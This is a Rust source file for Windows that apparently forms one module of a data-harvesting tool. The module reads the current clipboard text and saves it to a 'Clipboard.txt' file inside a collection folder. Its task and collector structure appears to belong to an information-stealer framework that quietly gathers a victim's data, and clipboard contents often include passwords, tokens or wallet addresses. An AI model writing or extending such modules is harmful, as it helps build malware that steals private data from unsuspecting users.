use crate::alloc::borrow::ToOwned;
use alloc::string::String;
use collector::atomic::AtomicCollector;
use core::ptr::{null_mut, slice_from_raw_parts};
use tasks::{parent_name, Task};
use utils::path::{Path, WriteToFile};
use windows_sys::Win32::System::DataExchange::{CloseClipboard, GetClipboardData, OpenClipboard};
use windows_sys::Win32::System::Memory::{GlobalLock, GlobalUnlock};

pub(super) struct ClipboardTask;

impl Task for ClipboardTask {
    parent_name!("Clipboard.txt");
    
    unsafe fn run(&self, parent: &Path, _: &AtomicCollector) {
        if OpenClipboard(null_mut()) == 0 {
            return;
        }
        
        let handle = GetClipboardData(13u32);
        if handle.is_null() {
            return;
        }
        
        let ptr = GlobalLock(handle);
        if ptr.is_null() {
            CloseClipboard();
            return;
        }
        
        let mut len = 0;
        let mut cur = ptr as *const u16;
        while *cur != 0 {
            len += 1;
            cur = cur.add(1);
        }
        
        let slice = slice_from_raw_parts(ptr as *const u16, len);
        let str = String::from_utf16_lossy(&*slice);
        
        GlobalUnlock(handle);
        CloseClipboard();
        
        let str = str.trim();
        if str.is_empty() {
            return;
        }
        
        let _ = str.write_to(parent);
    }
}